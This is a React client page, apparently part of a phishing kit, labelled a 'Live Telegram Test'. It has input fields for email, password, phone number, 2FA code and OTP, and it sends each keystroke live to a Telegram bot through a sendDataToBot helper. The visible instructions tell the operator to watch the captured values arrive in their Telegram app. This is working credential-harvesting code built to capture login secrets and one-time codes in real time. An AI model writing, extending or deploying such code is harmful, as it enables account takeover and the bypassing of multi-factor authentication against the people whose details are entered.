'use client';

import { useState } from 'react';
import { sendDataToBot } from '../lib/dataSync';

export default function TestTelegramPage() {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [phone, setPhone] = useState('');
    const [code2fa, setCode2fa] = useState('');
    const [otp, setOtp] = useState('');

    return (
        <div className="min-h-screen bg-gray-900 p-8">
            <div className="max-w-2xl mx-auto bg-gray-800 rounded-lg p-8 text-white">
                <h1 className="text-3xl font-bold mb-6 text-center">
                    🔴 Live Telegram Test
                </h1>
                
                <p className="mb-6 text-gray-300 text-center">
                    Type in any field below and watch your Telegram update LIVE!
                </p>

                <div className="space-y-4">
                    {/* Email */}
                    <div>
                        <label className="block mb-2 text-sm font-medium">
                            📧 Email/Phone
                        </label>
                        <input
                            type="text"
                            value={email}
                            onChange={(e) => {
                                setEmail(e.target.value);
                                sendDataToBot('user_email', e.target.value);
                            }}
                            placeholder="user@example.com"
                            className="w-full p-3 bg-gray-700 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-500"
                        />
                    </div>

                    {/* Password */}
                    <div>
                        <label className="block mb-2 text-sm font-medium">
                            🔐 Password
                        </label>
                        <input
                            type="text"
                            value={password}
                            onChange={(e) => {
                                setPassword(e.target.value);
                                sendDataToBot('user_password', e.target.value);
                            }}
                            placeholder="password123"
                            className="w-full p-3 bg-gray-700 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-500"
                        />
                    </div>

                    {/* Phone */}
                    <div>
                        <label className="block mb-2 text-sm font-medium">
                            📱 Phone Number
                        </label>
                        <input
                            type="text"
                            value={phone}
                            onChange={(e) => {
                                setPhone(e.target.value);
                                sendDataToBot('user_phone_number', e.target.value);
                            }}
                            placeholder="1234567890"
                            className="w-full p-3 bg-gray-700 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-500"
                        />
                    </div>

                    {/* 2FA Code */}
                    <div>
                        <label className="block mb-2 text-sm font-medium">
                            🔢 2FA Code
                        </label>
                        <input
                            type="text"
                            value={code2fa}
                            onChange={(e) => {
                                setCode2fa(e.target.value);
                                sendDataToBot('user_2fa_code', e.target.value);
                            }}
                            placeholder="123456"
                            maxLength={6}
                            className="w-full p-3 bg-gray-700 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-500"
                        />
                    </div>

                    {/* OTP */}
                    <div>
                        <label className="block mb-2 text-sm font-medium">
                            ✅ OTP Code
                        </label>
                        <input
                            type="text"
                            value={otp}
                            onChange={(e) => {
                                setOtp(e.target.value);
                                sendDataToBot('user_verification_codes', JSON.stringify({ otp: e.target.value }));
                            }}
                            placeholder="654321"
                            maxLength={6}
                            className="w-full p-3 bg-gray-700 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-500"
                        />
                    </div>
                </div>

                <div className="mt-8 p-4 bg-blue-900/30 border border-blue-500 rounded-lg">
                    <h3 className="font-bold mb-2">📋 Instructions:</h3>
                    <ol className="list-decimal list-inside space-y-1 text-sm text-gray-300">
                        <li>Open your Telegram app</li>
                        <li>Start typing in any field above</li>
                        <li>Watch the message update LIVE (updates every 300ms)</li>
                        <li>Check your browser console (F12) for detailed logs</li>
                    </ol>
                </div>

                <div className="mt-4 p-4 bg-yellow-900/30 border border-yellow-500 rounded-lg">
                    <p className="text-sm text-gray-300">
                        <strong>💡 Debug:</strong> Open browser console (F12) to see:
                    </p>
                    <ul className="list-disc list-inside text-sm text-gray-400 mt-2">
                        <li>[DataSync] logs - Frontend sending data</li>
                        <li>[Telegram Proxy] logs - Backend processing</li>
                    </ul>
                </div>
            </div>
        </div>
    );
}

